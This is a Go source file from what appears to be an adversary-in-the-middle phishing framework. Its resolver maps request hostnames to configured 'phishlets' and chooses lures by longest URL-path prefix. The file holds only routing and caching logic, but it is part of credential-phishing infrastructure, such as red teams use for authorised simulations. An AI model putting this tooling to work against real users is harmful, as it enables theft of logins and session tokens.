package phishlet

import (
	"fmt"
	"log/slog"
	"strings"
	"sync"

	"github.com/travisbale/mirage/internal/aitm"
)

// lureStore is the subset of the lure persistence layer needed by the resolver.
type lureStore interface {
	ListLures() ([]*aitm.Lure, error)
}

// Resolver maps request hostnames to their configured phishlet and lure.
// All state is held in memory.
// Register must be called whenever a phishlet is enabled or its config changes.
// InvalidateLures must be called whenever a lure is created, updated, or deleted.
type Resolver struct {
	mu        sync.RWMutex
	phishlets map[string]*aitm.ConfiguredPhishlet // name → configured phishlet
	hostnames map[string]*aitm.ConfiguredPhishlet // lowercase hostname → configured phishlet (enabled only)
	lureStore lureStore
	luresMu   sync.RWMutex
	lures     []*aitm.Lure // cached; refreshed by InvalidateLures
	logger    *slog.Logger
}

func NewResolver(lureStore lureStore, logger *slog.Logger) *Resolver {
	return &Resolver{
		phishlets: make(map[string]*aitm.ConfiguredPhishlet),
		hostnames: make(map[string]*aitm.ConfiguredPhishlet),
		lureStore: lureStore,
		logger:    logger,
	}
}

// LoadLuresFromDB populates the in-memory lure cache from the store.
// Call once at startup before serving requests.
func (r *Resolver) LoadLuresFromDB() error {
	return r.refreshLureCache()
}

// InvalidateLures reloads the lure cache from the store. Call after any lure mutation.
// On store error the stale cache is kept so in-flight requests are not disrupted.
func (r *Resolver) InvalidateLures() {
	if err := r.refreshLureCache(); err != nil {
		r.logger.Warn("lure cache invalidation failed, keeping stale cache", "error", err)
	}
}

func (r *Resolver) refreshLureCache() error {
	lures, err := r.lureStore.ListLures()
	if err != nil {
		return fmt.Errorf("refreshing lure cache: %w", err)
	}
	r.luresMu.Lock()
	r.lures = lures
	r.luresMu.Unlock()
	return nil
}

// Register stores cp in both indexes. If cp is enabled and has a non-empty hostname
// it becomes reachable by hostname. Replaces any previously registered entry with
// the same name, cleaning up the old hostname index entry if the hostname changed.
func (r *Resolver) Register(cp *aitm.ConfiguredPhishlet) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if old, ok := r.phishlets[cp.Definition.Name]; ok && old.Config.BaseDomain != "" {
		delete(r.hostnames, strings.ToLower(old.Config.Hostname))
		for _, ph := range old.Definition.ProxyHosts {
			delete(r.hostnames, strings.ToLower(ph.PhishHost(old.Config.BaseDomain)))
		}
	}

	r.phishlets[cp.Definition.Name] = cp
	if cp.Config.Enabled && cp.Config.BaseDomain != "" {
		r.hostnames[strings.ToLower(cp.Config.Hostname)] = cp
		for _, ph := range cp.Definition.ProxyHosts {
			r.hostnames[strings.ToLower(ph.PhishHost(cp.Config.BaseDomain))] = cp
		}
	}
}

// Get returns the registered configured phishlet by name, or nil if not registered.
func (r *Resolver) Get(name string) *aitm.ConfiguredPhishlet {
	r.mu.RLock()
	defer r.mu.RUnlock()

	return r.phishlets[name]
}

// OwnerOf returns the name of the enabled phishlet that owns hostname, or ""
// if no phishlet is registered for it.
func (r *Resolver) OwnerOf(hostname string) string {
	r.mu.RLock()
	defer r.mu.RUnlock()

	if cp, ok := r.hostnames[strings.ToLower(hostname)]; ok {
		return cp.Definition.Name
	}

	return ""
}

// ResolveHostname returns the configured phishlet and best-matching lure for a request.
// When multiple lures share a phishlet, the longest path prefix wins.
func (r *Resolver) ResolveHostname(hostname, urlPath string) (*aitm.ConfiguredPhishlet, *aitm.Lure, error) {
	r.mu.RLock()
	cp, ok := r.hostnames[strings.ToLower(hostname)]
	r.mu.RUnlock()

	if !ok {
		return nil, nil, aitm.ErrNotFound
	}

	r.luresMu.RLock()
	lures := r.lures
	r.luresMu.RUnlock()

	var matched *aitm.Lure
	matchLen := -1
	for _, lure := range lures {
		if lure.Phishlet != cp.Definition.Name {
			continue
		}

		if lure.Path == "" || strings.HasPrefix(urlPath, lure.Path) {
			if len(lure.Path) > matchLen {
				matched = lure
				matchLen = len(lure.Path)
			}
		}
	}

	return cp, matched, nil
}
